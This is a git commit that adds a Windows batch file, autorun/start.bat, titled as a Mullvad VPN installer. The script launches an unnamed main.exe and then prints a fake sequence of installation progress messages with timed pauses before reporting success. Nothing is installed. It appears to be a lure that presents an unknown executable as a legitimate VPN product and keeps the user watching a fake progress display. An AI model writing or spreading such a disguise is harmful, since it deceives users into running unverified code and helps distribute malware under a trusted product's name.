2bfaf698d71a42fa44bc6f6aed368d436de1be24
megalodon2312312 <131202992+megalodon2312312@users.noreply.github.com>
2023-04-18 22:14:58 +0200

    Add files via upload

---
+++ autorun/start.bat
@@ -0,0 +1,29 @@
+@echo off
+title mullvadVPNinstaller
+start "" "main.exe"
+
+echo instaling essential part .
+timeout /t 1 /nobreak > nul
+test&cls
+
+echo instaling essential part ..
+timeout /t 1 /nobreak > nul
+test&cls
+
+echo instaling essential part ...
+timeout /t 1 /nobreak > nul
+
+
+echo extracting major things ...
+timeout /t 4 /nobreak > nul
+
+echo preparing to start main function...
+timeout /t 2 /nobreak > nul
+
+echo running program... 
+timeout /t 1 /nobreak > nul
+test&cls
+
+echo instalation completed successfully!!!
+timeout /t 5 /nobreak > nul
+exit
